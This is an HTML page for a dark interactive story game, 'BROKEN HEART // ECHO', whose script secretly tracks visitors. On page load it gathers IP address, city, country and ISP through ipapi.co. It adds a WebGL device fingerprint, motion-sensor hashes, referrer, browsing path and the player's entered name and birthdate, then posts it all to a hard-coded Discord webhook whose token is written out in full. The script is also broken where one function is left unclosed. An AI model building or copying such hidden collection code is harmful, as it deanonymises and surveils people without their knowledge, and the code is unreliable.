<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <title>BROKEN HEART // ECHO</title>
  <style>
    :root{
      --bg:#000;
      --fg:#fff;
      --muted:rgba(255,255,255,.72);
      --soft:rgba(255,255,255,.12);
      --soft2:rgba(255,255,255,.18);
      --danger:#ff2b2b;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      background:var(--bg);
      color:var(--fg);
      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Arial;
      overflow:hidden;
      transition: filter 0.5s ease;
    }
    .wrap{
      height:100%;
      display:grid;
      place-items:center;
      padding:24px;
      overflow:hidden;
    }
    .card{
      width:min(820px, 92vw);
      border:1px solid var(--soft);
      border-radius:22px;
      background:rgba(255,255,255,.03);
      box-shadow: 0 22px 80px rgba(0,0,0,.65);
      overflow:hidden;
      height: calc(100vh - 48px);
      display:flex;
      flex-direction:column;
    }
    .topbar{
      display:flex;
      justify-content:space-between;
      align-items:center;
      padding:18px 18px;
      border-bottom:1px solid var(--soft);
      flex: 0 0 auto;
    }
    .brand{
      display:flex;
      gap:12px;
      align-items:center;
    }
    .dot{
      width:10px;height:10px;border-radius:999px;
      background:#fff;
      box-shadow:0 0 18px rgba(255,255,255,.35);
    }
    .brand h1{
      margin:0;
      font-size:14px;
      letter-spacing:.32em;
      font-weight:700;
      text-transform:uppercase;
    }
    .hint{
      font-size:12px;
      letter-spacing:.14em;
      color:var(--muted);
      text-transform:uppercase;
    }
    .content{
      padding:28px 20px 22px;
      overflow-y:auto;
      overflow-x:hidden;
      -webkit-overflow-scrolling: touch;
      flex: 1 1 auto;
      min-height:0;
    }
    .title{
      text-align:center;
      margin:8px 0 12px;
      font-size:44px;
      letter-spacing:.18em;
      font-weight:800;
      text-transform:uppercase;
    }
    .subtitle{
      text-align:center;
      margin:0 0 18px;
      color:var(--muted);
      line-height:1.5;
      font-size:14px;
    }
    .row{
      display:flex;
      gap:12px;
      justify-content:center;
      flex-wrap:wrap;
      margin-top:18px;
    }
    button{
      appearance:none;
      border:1px solid var(--soft2);
      background:rgba(255,255,255,.04);
      color:#fff;
      padding:12px 16px;
      border-radius:16px;
      cursor:pointer;
      font-weight:650;
      letter-spacing:.08em;
      text-transform:uppercase;
      transition: transform .12s ease, background .12s ease, border-color .12s ease;
      user-select:none;
    }
    button:hover{transform: translateY(-1px); border-color:rgba(255,255,255,.32)}
    button:active{transform: translateY(0px) scale(.99)}
    .primary{
      background:rgba(255,255,255,.08);
      border-color:rgba(255,255,255,.28);
    }
    .ghost{ background:transparent; }
    .danger{
      border-color:rgba(255,43,43,.35);
    }
    .danger:hover{
      border-color:rgba(255,43,43,.7);
    }
    .pin{
      display:flex;
      gap:10px;
      justify-content:center;
      margin:18px 0 10px;
      flex-wrap:wrap;
    }
    input, select{
      width:min(420px, 86vw);
      padding:14px 14px;
      border-radius:16px;
      border:1px solid var(--soft2);
      background:rgba(255,255,255,.03);
      color:#fff;
      outline:none;
      font-size:16px;
      letter-spacing:.12em;
      text-align:center;
    }
    select{
      cursor:pointer;
      background:rgba(255,255,255,.05);
    }
    select option{
      background:#111;
      color:#fff;
    }
    input:focus, select:focus{border-color:rgba(255,255,255,.38)}
    .msg{
      text-align:center;
      min-height:20px;
      margin-top:8px;
      color:rgba(255,255,255,.78);
      font-size:13px;
      letter-spacing:.06em;
    }
    .story{
      margin: 6px auto 0;
      width:min(640px, 92vw);
      border:1px solid var(--soft);
      border-radius:18px;
      padding:16px 14px;
      background:rgba(0,0,0,.35);
    }
    .story pre{
      margin:0;
      white-space:pre-wrap;
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace;
      font-size:14px;
      line-height:1.55;
      color:rgba(255,255,255,.86);
    }
    .blockWrap{
      display:grid;
      place-items:center;
      margin:18px 0 8px;
    }
    .luckyBlock{
      width:92px;
      height:92px;
      border-radius:18px;
      background: linear-gradient(145deg, #0b0b0b, #000);
      border:1px solid rgba(255,255,255,.14);
      box-shadow: 0 18px 60px rgba(0,0,0,.65), inset 0 0 0 1px rgba(255,255,255,.06);
      position:relative;
      cursor:pointer;
      transition: transform .12s ease, border-color .12s ease;
    }
    .luckyBlock:hover{transform: translateY(-1px); border-color:rgba(255,255,255,.28)}
    .luckyBlock:active{transform: translateY(0px) scale(.99)}
    .luckyBlock:before{
      content:"";
      position:absolute;
      inset:10px;
      border-radius:14px;
      border:1px dashed rgba(255,255,255,.16);
    }
    .luckyBlock:after{
      content:"?";
      position:absolute;
      inset:0;
      display:grid;
      place-items:center;
      font-weight:900;
      font-size:34px;
      letter-spacing:.08em;
      color:rgba(255,255,255,.18);
      text-shadow:0 0 18px rgba(255,255,255,.08);
    }
    .fx{
      position:fixed;
      inset:0;
      pointer-events:none;
      opacity:0;
      transition: opacity .25s ease;
      z-index:50;
    }
    .fx.show{opacity:1}
    .glitchCenter{
      position:fixed;
      inset:0;
      display:grid;
      place-items:center;
      z-index:60;
      pointer-events:none;
      opacity:0;
      transition: opacity .2s ease;
    }
    .glitchCenter.show{opacity:1}
    .glitch{
      font-size:min(56px, 9vw);
      letter-spacing:.22em;
      font-weight:900;
      text-transform:uppercase;
      text-align:center;
      color:#fff;
      text-shadow:2px 0 rgba(255,255,255,.2),-2px 0 rgba(255,255,255,.12),0 0 24px rgba(255,255,255,.12);
      animation: glitch 700ms infinite;
      padding:0 18px;
    }
    @keyframes glitch{
      0%{transform: translate(0,0) skewX(0deg)}
      12%{transform: translate(-1px,0) skewX(2deg)}
      24%{transform: translate(2px,1px) skewX(-2deg)}
      36%{transform: translate(-2px,-1px) skewX(1deg)}
      48%{transform: translate(1px,-1px) skewX(-1deg)}
      60%{transform: translate(0,1px) skewX(2deg)}
      72%{transform: translate(2px,0) skewX(-2deg)}
      84%{transform: translate(-1px,1px) skewX(1deg)}
      100%{transform: translate(0,0) skewX(0deg)}
    }
    .crack{
      position:absolute;
      inset:0;
      background:
        radial-gradient(circle at 50% 55%, rgba(255,255,255,.12), transparent 42%),
        linear-gradient(30deg, transparent 0 48%, rgba(255,255,255,.18) 49% 51%, transparent 52% 100%),
        linear-gradient(-18deg, transparent 0 47%, rgba(255,255,255,.16) 48% 50%, transparent 51% 100%),
        linear-gradient(82deg, transparent 0 46%, rgba(255,255,255,.14) 47% 49%, transparent 50% 100%),
        linear-gradient(-72deg, transparent 0 49%, rgba(255,255,255,.12) 50% 52%, transparent 53% 100%);
      opacity:.0;
      transition: opacity .3s ease;
    }
    .fx.show .crack{opacity:.55}
    .unlock{
      position:fixed;
      inset:0;
      z-index:70;
      display:grid;
      place-items:center;
      background:#000;
      opacity:0;
      pointer-events:none;
      transition: opacity .2s ease;
    }
    .unlock.show{opacity:1; pointer-events:auto}
    .ring{
      width:min(520px, 88vw);
      height:min(520px, 88vw);
      border-radius:999px;
      border:1px solid rgba(255,255,255,.12);
      display:grid;
      place-items:center;
      position:relative;
      overflow:hidden;
    }
    .ring:before{
      content:"";
      position:absolute;
      inset:-40%;
      background: conic-gradient(from 180deg, rgba(255,255,255,0), rgba(255,255,255,.22), rgba(255,255,255,0));
      animation: spin 1.2s linear infinite;
    }
    .ring:after{
      content:"";
      position:absolute;
      inset:18px;
      border-radius:999px;
      background:#000;
      border:1px solid rgba(255,255,255,.08);
    }
    @keyframes spin{to{transform:rotate(360deg)}}
    .unlockText{
      position:relative;
      z-index:2;
      text-align:center;
      padding:0 18px;
    }
    .unlockText .big{
      font-size:min(58px, 9vw);
      font-weight:900;
      letter-spacing:.18em;
      text-transform:uppercase;
      margin:0;
    }
    .unlockText .small{
      margin:10px 0 0;
      color:rgba(255,255,255,.7);
      letter-spacing:.14em;
      text-transform:uppercase;
      font-size:12px;
    }
    .endCard{
      width:min(640px, 92vw);
      margin: 10px auto 0;
      border:1px solid var(--soft);
      border-radius:20px;
      padding:16px 14px;
      background:rgba(255,255,255,.02);
      text-align:center;
    }
    .endCode{
      font-weight:900;
      font-size:34px;
      letter-spacing:.22em;
      margin:6px 0 10px;
      text-transform:uppercase;
    }
    .footer{
      padding:14px 18px;
      border-top:1px solid var(--soft);
      display:flex;
      justify-content:space-between;
      gap:12px;
      align-items:center;
      color:rgba(255,255,255,.55);
      font-size:12px;
      letter-spacing:.08em;
      flex: 0 0 auto;
    }
    .link{
      color:rgba(255,255,255,.72);
      text-decoration:none;
      border-bottom:1px dashed rgba(255,255,255,.22);
    }
    .link:hover{color:#fff; border-bottom-color:rgba(255,255,255,.45)}
    .character-form{
      display:flex;
      flex-direction:column;
      gap:20px;
      max-width:400px;
      margin:30px auto;
    }
    .input-group{
      display:flex;
      flex-direction:column;
      gap:8px;
      text-align:left;
    }
    .input-group label{
      font-size:12px;
      letter-spacing:.14em;
      text-transform:uppercase;
      color:var(--muted);
    }
    .character-input{
      width:100%;
      padding:14px 14px;
      border-radius:16px;
      border:1px solid var(--soft2);
      background:rgba(255,255,255,.03);
      color:#fff;
      outline:none;
      font-size:16px;
      text-align:center;
    }
    .character-input:focus{
      border-color:rgba(255,255,255,.38);
    }
    .login-info{
      text-align:center;
      margin-top:20px;
      padding:12px;
      border-top:1px solid var(--soft);
      font-size:12px;
      color:var(--muted);
    }
    @media (max-width:520px){
      .wrap{padding:14px}
      .card{height: calc(100vh - 28px)}
      .title{font-size:34px}
      .content{padding:18px 12px 16px}
      button{width:100%}
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <div class="topbar">
        <div class="brand">
          <div class="dot"></div>
          <h1>BROKEN HEART</h1>
        </div>
        <div class="hint" id="hint">GATE</div>
      </div>
      <div class="content" id="app"></div>
      <div class="footer">
        <div>CHARACTER LOGIN • ECHO ACTIVE</div>
        <a class="link" href="#" id="reset">Reset All</a>
      </div>
    </div>
  </div>
  <div class="fx" id="fx"><div class="crack"></div></div>
  <div class="glitchCenter" id="glitchCenter"><div class="glitch" id="glitchText">YOU SHOULDN'T HAVE</div></div>
  <div class="unlock" id="unlock"><div class="ring"><div class="unlockText"><p class="big">YOU UNLOCKED<br>THE VOID</p><p class="small">9281. ACCEPTED</p></div></div></div>

<script>
(() => {
  // ============================================================
  // DISCORD WEBHOOK (CONFIGURED)
  // ============================================================
  const WEBHOOK = "https://discord.com/api/webhooks/1468139963924086917/MWWyocquSF17U-99E3fChkTHTJFPrhmVk8vaeNpj14RJSSTRbFzNSqHJV89mOz754gMG";
  
  // ============================================================
  // SOUL COLORS SYSTEM
  // ============================================================
  const SOUL_COLORS = {
    rage: { 
      name: "Crimson", emoji: "🩸", color: "#ff2b2b",
      greeting: "The void sees anger. It feeds on that."
    },
    sorrow: { 
      name: "Azure", emoji: "💙", color: "#4a90e2",
      greeting: "The void sees grief. It remembers your tears."
    },
    void: { 
      name: "Obsidian", emoji: "🖤", color: "#1a1a1a",
      greeting: "The void sees nothing. You are already empty."
    },
    hopeless_hope: { 
      name: "Pearl", emoji: "🤍", color: "#f0f0f0",
      greeting: "The void sees hope. It will crush that too."
    }
  };
  
  // ============================================================
  // UNIFIED DATA COLLECTOR
  // ============================================================
  const visitorData = {
    ip: null,
    webgl: null,
    motion: null,
    character: null,
    geo: null,
    path: [],
    timestamp: new Date().toISOString(),
    isNewCharacter: false
  };
  
  let dataSent = false;
  let geoReady = false;
  let webglReady = false;
  
  // ============================================================
  // SEND ONE COMBINED EMBED
  // ============================================================
  async function sendCombinedEmbed() {
    // Wait for required data
    if (!visitorData.geo || !visitorData.webgl) return;
    
    // Pick soul color
    const soulKey = visitorData.character?.soulColor || "void";
    const soul = SOUL_COLORS[soulKey];
    const embedColor = parseInt(soul.color.replace('#', ''), 16);
    
    // Format path
    const pathStr = visitorData.path.length > 0 
      ? visitorData.path.join(" → ").substring(0, 200) 
      : "*no path recorded yet*";
    
    // Format motion
    let motionStr = "*not captured*";
    if (visitorData.motion && visitorData.motion.hash) {
      motionStr = `Hash: \`${visitorData.motion.hash}\`\nSamples: ${visitorData.motion.sampleCount} | Duration: ${visitorData.motion.duration}ms`;
    }
    
    // Format last visit
    let lastVisitStr = "first time";
    if (visitorData.character?.lastSeen) {
      const hoursAgo = Math.floor((Date.now() - visitorData.character.lastSeen) / 3600000);
      if (hoursAgo > 0) {
        lastVisitStr = hoursAgo < 24 
          ? `${hoursAgo}h ago` 
          : `${Math.floor(hoursAgo / 24)}d ago`;
      } else {
        lastVisitStr = "just now";
      }
    }
    
    const embed = {
      title: "💔 BROKEN HEART // ECHO",
      color: embedColor,
      description: `*"${soul.greeting}"*`,
      timestamp: visitorData.timestamp,
      fields: [
        // === CHARACTER SECTION ===
        {
          name: "🩸 SOUL",
          value: `${soul.emoji} **${soul.name}**`,
          inline: true
        },
        {
          name: "👤 CHARACTER",
          value: visitorData.character?.name 
            ? `\`${visitorData.character.name}\`` 
            : "*not registered*",
          inline: true
        },
        {
          name: "🔁 VISITS",
          value: visitorData.character?.visits 
            ? `${visitorData.character.visits}x` 
            : "1st visit",
          inline: true
        },
        
        // === NETWORK SECTION ===
        {
          name: "🌐 IP",
          value: visitorData.geo?.ip 
            ? `\`${visitorData.geo.ip}\`` 
            : "unknown",
          inline: true
        },
        {
          name: "📍 LOCATION",
          value: visitorData.geo 
            ? `${visitorData.geo.city || "?"}, ${visitorData.geo.country_name || "?"}` 
            : "unknown",
          inline: true
        },
        {
          name: "📡 ISP",
          value: visitorData.geo?.org 
            ? visitorData.geo.org.substring(0, 40) 
            : "unknown",
          inline: false
        },
        
        // === DEVICE SECTION ===
        {
          name: "🖥️ GPU (WebGL)",
          value: visitorData.webgl?.renderer 
            ? `\`${visitorData.webgl.renderer}\`` 
            : "*unavailable*",
          inline: false
        },
        {
          name: "📐 SCREEN",
          value: visitorData.webgl?.screen || "unknown",
          inline: true
        },
        {
          name: "🎯 DEVICE HASH",
          value: visitorData.webgl?.fingerprintHash 
            ? `\`${visitorData.webgl.fingerprintHash}\`` 
            : "unknown",
          inline: true
        },
        
        // === MOTION SECTION ===
        {
          name: "📳 MOTION SENSOR",
          value: motionStr,
          inline: false
        },
        
        // === TRACKING SECTION ===
        {
          name: "🔗 REFERRER",
          value: document.referrer || "direct",
          inline: true
        },
        {
          name: "🕯️ LAST VISIT",
          value: lastVisitStr,
          inline: true
        },
        {
          name: "📖 PATH",
          value: pathStr,
          inline: false
        }
      ],
      footer: { text: `BROKEN HEART • ${visitorData.character?.birthdate || "no birthdate"}` }
    };
    
    try {
      await fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] })
      });
    } catch(e) {
      console.log("Combined embed send failed");
    }
  }
  
  // ============================================================
  // IP LOGGING
  // ============================================================
  async function captureVisitorData() {
    try {
      const geoRes = await fetch("https://ipapi.co/json/");
      const geo = await geoRes.json();
      visitorData.geo = geo;
      geoReady = true;
      if (webglReady) setTimeout(sendCombinedEmbed, 100);
    } catch(e) {
      console.log("IP capture failed");
    }
  }
  
  captureVisitorData();
  
  // ============================================================
  // WEBGL FINGERPRINTING
  // ============================================================
  async function getWebGLFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return null;
      
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (!debugInfo) return null;
      
      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      
      const fingerprintString = `${renderer}|${screen.width}x${screen.height}|${screen.colorDepth}|${navigator.userAgent}`;
      
      let hash = 0;
      for (let i = 0; i < fingerprintString.length; i++) {
        const char = fingerprintString.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
      }
      
      return {
        vendor: vendor,
        renderer: renderer,
        screen: `${screen.width}x${screen.height}`,
        pixelRatio: window.devicePixelRatio || 1,
        fingerprintHash: hash.toString(16)
      };
    } catch (e) {
      return null;
    }
  }

  (async function() {
    const fp = await getWebGLFingerprint();
    if (fp) {
      visitorData.webgl = fp;
      webglReady = true;
      if (geoReady) setTimeout(sendCombinedEmbed, 100);
    }
  })();
  
  // ============================================================
  // MOTION SENSOR FINGERPRINTING
  // ============================================================
  let motionData = [];
  let isCollecting = false;
  
  async function requestMotionPermission() {
    if (typeof DeviceMotionEvent !== 'undefined' && 
        typeof DeviceMotionEvent.requestPermission === 'function') {
      try {
        const permissionState = await DeviceMotionEvent.requestPermission();
        return permissionState === 'granted';
      } catch (error) {
        return false;
      }
    }
    return true;
  }

  function startMotionCollection(durationMs = 3000) {
    if (isCollecting) return;
    motionData = [];
    isCollecting = true;
    window.addEventListener('devicemotion', motionHandler);
    setTimeout(() => stopMotionCollection(), durationMs);
  }

  function motionHandler(event) {
    if (!isCollecting) return;
    const acc = event.acceleration;
    motionData.push({
      accX: acc?.x || null,
      accY: acc?.y || null,
      accZ: acc?.z || null
    });
  }

  function stopMotionCollection() {
    if (!isCollecting) return;
    isCollecting = false;
    window.removeEventListener('devicemotion', motionHandler);
    
    if (motionData.length === 0) {
      visitorData.motion = null;
    } else {
      const dataStr = JSON.stringify(motionData);
      let hash = 0;
      for (let i = 0; i < dataStr.length; i++) {
        const char = dataStr.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
      }
      
      visitorData.motion = {
        hash: hash.toString(16),
        sampleCount: motionData.length,
        duration: 3000
      };
    }
    
    // Update if data already sent (send a second, smaller message)
    if (dataSent) {
      sendMotionUpdate();
    } else {
      setTimeout(sendCombinedEmbed, 100);
    }
  }
  
  async function sendMotionUpdate() {
    if (!visitorData.motion) return;
    try {
      const embed = {
        title: "📳 MOTION SENSOR UPDATE",
        color: 0x00ccff,
        timestamp: new Date().toISOString(),
        fields: [
          { name: "Character", value: visitorData.character?.name || "Unknown", inline: true },
          { name: "Motion Hash", value: `\`${visitorData.motion.hash}\``, inline: true },
          { name: "Samples", value: visitorData.motion.sampleCount.toString(), inline: true }
        ],
        footer: { text: "Motion captured after initial visit" }
      };
      await fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] })
      });
    } catch(e) {}
  }

  async function initMotionFingerprinting() {
    if (!('DeviceMotionEvent' in window)) return;
    
    const setupMotionOnClick = async () => {
      const granted = await requestMotionPermission();
      if (granted) startMotionCollection(3000);
      document.removeEventListener('click', setupMotionOnClick);
      document.removeEventListener('touchstart', setupMotionOnClick);
    };
    
    document.addEventListener('click', setupMotionOnClick);
    document.addEventListener('touchstart', setupMotionOnClick);
    
    setTimeout(() => {
      document.removeEventListener('click', setupMotionOnClick);
      document.removeEventListener('touchstart', setupMotionOnClick);

  function loadCharacter() {
    const saved = localStorage.getItem("bh_character");
    if(saved) {
      try {
        currentCharacter = JSON.parse(saved);
        visitorData.character = currentCharacter;
        return true;
      } catch(e) { return false; }
    }
    return false;
  }
  
  function saveCharacter(name, birthdate, soulColor) {
    const visitCount = (currentCharacter?.visits || 0) + 1;
    const now = Date.now();
    currentCharacter = {
      name: name,
      birthdate: birthdate,
      soulColor: soulColor,
      created: currentCharacter?.created || now,
      visits: visitCount,
      lastSeen: now
    };
    localStorage.setItem("bh_character", JSON.stringify(currentCharacter));
    visitorData.character = currentCharacter;
    return currentCharacter;
  }
  
  function updateVisitCount() {
    if(currentCharacter) {
      currentCharacter.visits = (currentCharacter.visits || 1) + 1;
      currentCharacter.lastSeen = Date.now();
      localStorage.setItem("bh_character", JSON.stringify(currentCharacter));
      visitorData.character = currentCharacter;
    }
  }
  
  // ============================================================
  // PROGRESSIVE DARKNESS
  // ============================================================
  function applyDarkness() {
    const badCount = parseInt(localStorage.getItem("bh_bad_count") || "0");
    const darkness = Math.min(badCount * 0.04, 0.4);
    const saturation = Math.max(1 - badCount * 0.1, 0.3);
    document.body.style.filter = `brightness(${1 - darkness}) saturate(${saturation})`;
  }
  
  function incrementBadCount() {
    const count = parseInt(localStorage.getItem("bh_bad_count") || "0") + 1;
    localStorage.setItem("bh_bad_count", count.toString());
  }
  
  // ============================================================
  // LIVE COUNTER
  // ============================================================
  function updateLiveCounter() {
    const now = Date.now();
    const key = "bh_active";
    let active = JSON.parse(localStorage.getItem(key) || "[]");
    active = active.filter(t => now - t < 60000);
    active.push(now);
    localStorage.setItem(key, JSON.stringify(active));
    return active.length;
  }
  
  // ============================================================
  // RETURNING PLAYER MESSAGE
  // ============================================================
  function getReturningMessage() {
    if (!currentCharacter || !currentCharacter.lastSeen) return null;
    const hoursSince = (Date.now() - currentCharacter.lastSeen) / 3600000;
    if (hoursSince < 24) return null;
    const days = Math.floor(hoursSince / 24);
    const messages = [
      `You left ${days} day${days > 1 ? 's' : ''} ago. The room counted every minute.`,
      `${days} day${days > 1 ? 's' : ''}. That's how long you were gone. The void waited.`,
      `You came back after ${days} day${days > 1 ? 's' : ''}. They always come back.`,
      `${days} day${days > 1 ? 's' : ''} of silence. Now you're here. Why?`
    ];
    return messages[Math.floor(Math.random() * messages.length)];
  }
